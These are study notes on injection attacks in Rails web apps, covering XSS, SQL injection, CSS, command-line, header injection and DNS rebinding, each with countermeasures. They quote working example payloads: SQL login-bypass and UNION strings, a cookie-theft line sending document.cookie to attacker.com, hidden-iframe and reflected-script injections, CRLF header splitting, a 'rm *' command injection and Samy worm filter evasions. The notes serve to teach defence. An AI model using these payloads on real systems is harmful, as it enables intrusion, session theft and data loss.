## Injection
- Attacks that introduce malicious code or parameters into webapp
  - In order to run it within its security context
- It is tricky because the same code or parameter can be malicious in one context
  - But totally harmless in another
- A context can be scripting, query, programming language shell, ruby/rails method

### Permitted vs Restricted Lists
- Restricted list contains bad email addresses, non-public action, bad html tags
- Permitted list contains good email addresses, public actions, good html tags
- When sanitizing, protecting, verifying something, prefer permitted lists
- Though sometimes it's not possible to create a permitted list (e.g. spam filter)
- Use `before_action except: []` instead of `only: []` for security related actions
  - This way you don't forget to enable security checks for new actions
- Allow `<strong>` instead of removing `<script>` against cross site scripting (XSS)
- Don't try to correct user input using restricted lists
  - This will make the attack work: `"<sc<script>ript>".gsub("<script>", "")`
  - But reject malformed input

### Cross Site Scripting (XSS)
- An attacker injects client-side executable code
  - Web app saves it and displays it on the page, later presented to a victim
- Most XSS examples simply display an alert box, but it is more powerful than that
  - It can run javascript that performs harmful operations
- XSS can steal the cookie, hijack the session, redirect victim to fake website
  - Display advertisements for the benefit of the attacker
  - Change elements on the website to get confidential information
  - Install malicious software through security holes in the web browser
- It is common to exploit SQL injection vulnerability in a web app framework
  - Insert malicious code in every textual table column

### Entry points
- Vulnerable url and its parameters where an attacker can start an attack
  - Most common entry points are message posts, user comments, guest books
  - Project titles, document names, search result pages have also been vulnerable
  - Just about everywhere where the user can input data
  - The input doesn't necessarily have to come from input boxes on webpages
  - It can be any url parameter, obvious, hidden or internal
- User may intercept any traffic
  - Applications or client-site proxies make it easy to change requests
  - There are also other attack vectors like banner advertisements
- Mpack attack framework
  - Tries to install malicious software through security holes in the web browser
  - Very successfully, 50% of the attacks succeed

## SQL Injection
- Aim at influencing database queries by manipulating webapp parameters
  - A popular goal is to bypass authorization
  - Another goal is to carry out data manipulation or reading arbitrary data
- For example, do not use user input in a query directly
  - `Project.where("name = '#{params[:name]}'")`
  - If a user enters `'OR 1) --`, the resulting query will be
  - `SELECT * FROM projects WHERE (name = '' OR 1) --)`
  - The two dashes start a comment ignoring everything after it
  - So the query returns all records fronn the project table

### Bypassing Authorization
- Usually web application includes access control
- User enters login credentials and webapp tries to find matching record in users table
- The app grants access when it finds a record
- An attacker may possibly bypass this check using SQL injection like this
  - If an attacker enters `' OR '1'='1` as the name, and `' OR '2'>'1` as the password
  - `User.find_by("login = '#{params[:name]}' AND password = '#{params[:password]}'")`
  - The resulting query will be
  - `SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIMIT 1`
  - This will find the first record in the database and grant access

### Unauthorized Reading
- THe union statement connects two SQL queries and returns the data in one set
- An attacker can use it to read arbitrary data from the database
- For example
  - `Project.where("name = '#{params[:name]}'")`
  - Inject another query using union
  - `') UNION SELECT id, login AS name, password AS description, 1, 1, 1 FROM users --`
  - The resulting query will be
  - `SELECT * FROM projects WHERE (name = '') UNION`
    - `SELECT id, login AS name, password AS description, 1, 1, 1 FROM users --'`
- The result won't be a list of project (as there is no project with empty name)
  - But a list of usernames and their password
  - So hopefully you securely hashed the password in the database
  - The only problem for the attacker is that
    - The number of columns has to be the same in both queries (required for union)
    - That's why the second query includes a list of ones
  - Also, it renames some columns so that the app displays the values in that field

### Countermeasures
- Rails has a built-in filter for special SQL chars
  - To escape ', ", NULL, and line breaks
  - Using `find` or `find_by_something` automatically applies this countermeasure
- But in SQL fragments like `where`, `connection.execute`, `find_by_sql`
  - It has to be applied manually
- Instead of passing a string, use positional handlers to sanitize tainted string
  - `Model.where("zip_code = ? AND quantity >= ?", entered_zip_code, entered_quantity)`
  - The question marks will be replaced by the value of parameters
- Named handlers can also be used
  - `values = { zip: entered_zip_code, qty: entered_quantity }`
  - `Model.where("zip_code = :zip AND quantity >= :qty", values)`
- Can split and chain conditionals
  - `Model.where(zip_code: entered_zip_code).where("quantity >= ?", entered_quantity)`
- In other raw SQL strings, can use `sanitize_sql`

## HTML Javascript Injection
- Most common XSS language is of course the most popular client-side scripting language
  - Javascript, often in combination with HTML
  - <script>alert('Hello');</script>
  - <img src="javascript:alert('Hello')">
  - <table background="javascript:alert('Hello')">
- Escaping user input is essential

### Cookie Theft
- Javascript enforces same origin policy
  - Script from one domain cannot access cookies of another domain
- 'document.cookie' holds the cookie of the originating web server
  - You can read & write this property if you embed the code directly in HTML document
  - <script>document.write(document.cookie);</script>
  - But that is not useful to the attacker as they will see their own cookie
- This will try to load an image from the specific url plus the cookie
  - document.write('<img src="http://www.attacker.com/' + document.cookie + '">')
  - This url doesn't exist, so the browser displays nothing
    - But the attacker can review their web server's access log files
    - To see the victim's cookie
  - The log files on 'www.attacker.com' will read like this
    - GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
- These attackes can be mitigated by adding the 'httpOnly' flag to cookies
  - So that 'document.cookie' may not be read by javascript
  - Though the cookies will still be visible using Ajax

### Defacement
- With web page defacement, an attacker can do a lot of things. For example,
  - Present false information or lure the victim on the attacker's website
  - To steal cookie, login credentials, or other sensitive data
- Most popular way is to include code from external sources by iframes
  - <iframe src="http://58.xx.xxx.xxx" style="display:none"></iframe>
  - This loads arbitrary html and/or javascript from external source
  - And embeds it as part of the site
- A more specialized attack could overlap the entire website
  - Or display a login form which looks the same as the site's original
    - But transmits the username & password to the attacker's site
  - Or it could use CSS and/or javascript to hide a legitimate link
    - And display another one at its place which redirects to a fake website
- Reflected injection attacks are those where the payload is not stored
  - It's not presented to the victim, but it's included in the url
  - Especially search forms fail to escape the search string
  - `http://www.news.com/?zipcode=1--><script src=http://www.attacker.com></script><!--`

### Obfuscation and Encoding Injection
- Network traffic is mostly based on the limited western alphabet
- So new char encodings like unicode emerged to transmit chars in other languages
  - But this is also a threat to web apps
  - As malicious code can be hidden in different encodings
  - That web browser might be able to process but web app might not
  - <img src=&#106;&#97;&#118; ...>
- `sanitize()` method does a good job to fend off encoding attacks

### Countermeasures
- It is important to filter malicious input and to escape the output of the web app
- Especially for XSS, it is important to do permitted input filtering (over restricted)
  - `sanitize(user_input, tags: allowed_tags, attributes: allowed_attributes)`
- Restricted list are never complete
  - Imagine a restricted list deletes 'script' from user input
  - Now the attacker injects `<scrscriptipt>`, so after filter `<script>` remains
- Use `html_escape()` to replace html input chars &, ", <, >
  - By their uninterpreted representations in html &amp;, &quot;, &lt;, &gt;

## CSS Injection
- It is actually javascript injection because some browsers allow javascript in CSS
- As custom CSS in web apps is quite rare feature
  - It may be hard to find a good permitted CSS filter
- If you want to allow custom colors or images
  - You can allow the user to choose them
  - And build the CSS in the web app
- Use sanitize() method as a model for a permitted CSS filter

### Example: MySpace Samy worm
- It automatically sent a friend request to Samy (the attacker)
  - Simply by visiting his profile
  - Within several hours he had over 1 million friend requests
  - Which created so much traffic that MySpace went offline
- MySpace blocked many tags, but allowed CSS, so the attacker put javascript into CSS
  - <div style="background:url('javascript:alert(1)')">
  - But there are no quotes allowed in the payload
  - Because single & double quotes have already been used
- But javascript has a handly eval() function to execute any string as code
  ```html
  <div
    id="mycode"
    expr="alert('hah!')"
    style="background:url('javascript:eval(document.all.mycode.expr)')"
  >
  ```
- The eval() function is a nightmare for restricted list input filters
  - As it allows the style attribute to hide the word 'innerHTML'
  - `alert(eval('document.body.inne' + 'rHTML'));`
- The next problem was MySpace filtering the word 'javascript'
  - So the author used `java<NEWLINE>script` to get around this
  ```html
  <div
    id="mycode"
    expr="alert('hah!')"
    style="background:url('java↵script:eval(document.all.mycode.expr)')"
  >
  ```
- Another problem for the author was the CSRF security tokens
  - Without them, he couldn't send a friend request over POST
  - He got around it by sending a GET to the page right before adding a user
  - And parsing the result for the CSRF token
- In the end, he got a 4KB worm which he injected into his profile page

## Textile Injection
- If you want to provide text formatting other than html (due to security)
- Use a markup language which is converted to html on the server side
  - One such language for ruby is redcloth
  - But without precautions it is also vulnerable to XSS
  - Use redcloth in combination with permitted input filter

## Command Line Injection
- There are several methods in ruby to execute commands in underlying OS
  - system(cmd), exec(cmd), spawn(cmd), `cmd`
- If a user may enter the whole command or a part of it
  - You will have to be especially careful with these functions
  - Because you can execute another command at the end of the first one
  - Example 1: By concatenating them with a semicolon (;) or a vertical bar (|)
    - `system("/bin/echo #{user_input}")`
    - `user_input = "hello; rm *"`
  - Example 2: Kernel's open executes OS command with arg starts with (|)
    - `open('| ls') { |file| file.read }`
- Countermeasures are to use `File.open`, `IO.open` or `URI#open`
  - They don't execute an OS command (doesn't accept `| ls` as a command)
  - `File.open('| ls') { |file| file.read }`
  - `IO.open(0) { |file| file.read }`
  - `URI('https://example.com').open { |file| file.read }`

## Header Injection
- HTTP headers are dynamically generated
  - Under certain circumstances user input may be injected
  - This can lead to false redirection, XSS or HTTP response splitting
- Request headers have a referrer, user-agent (browser), cookie field, etc.
  - All of them are user supplied and may be manipulated with more or less effort
  - Remember to escape these header fields
  - E.g. when displaying the user agent in an admin area
- Response headers hava a status code, cookie, location (redirection target url), etc.
  - Pay attention while building response headers partly based on user input
  - E.g. you want to redirect the user back to a specific page

### Referer Header
- You want to redirect the user back to a specific page
  - So you introduce a referer field in a form: `redirect_to params[:referer]`
  - Rails puts the string into the location header and sends 302 status (redirect)
- The first thing a malicious user would do is
  - `http://www.webapp.com/controller/action?referer=http://www.malicious.tld`
- Due to a bug in old rails, a hacker may inject arbitrary header fields
  - `?referer=http://www.malicious.tld%0d%0aX-Header:+Hi!`
  - `?referer=path/at/your/app%0d%0aLocation:+http://www.malicious.tld`
- Note that %0d%0a is URL-encoded for \r\n
  - Which is a carriage-return and line-feed (CRLF) in ruby
  - So the resulting HTTP header will overwrite the original location header
  - HTTP/1.1 302 Moved Temporarily, Location: http://www.malicious.tld

### DNS Rebinding and Host Header Attacks
- DNS rebinding is a method of manipulating resolution of domain names
- DNS rebinding circumvents the same-origin policy by abusing DNS instead
  - It rebinds a domain to a different IP address
  - And then compromises the system by executing random code against the web app
    - From the changed IP address
- To guard against DNS rebinding and other Host header attacks
  - It is recommended to use the ActionDispatch::HostAuthorization middleware
  - It is enabled by default in the development environment
  - You have to activate it in production and other environments
  - You can also configure exceptions and set your own response app

```rb
Rails.application.config.hosts << "product.com"

Rails.application.config.host_authorization = {
  # Exclude requests for the /healthcheck/ path from host checking
  exclude: ->(request) { request.path.include?("healthcheck") },
  # Add custom Rack application for the response
  response_app: -> env do
    [400, { "Content-Type" => "text/plain" }, ["Bad Request"]]
  end
}
```
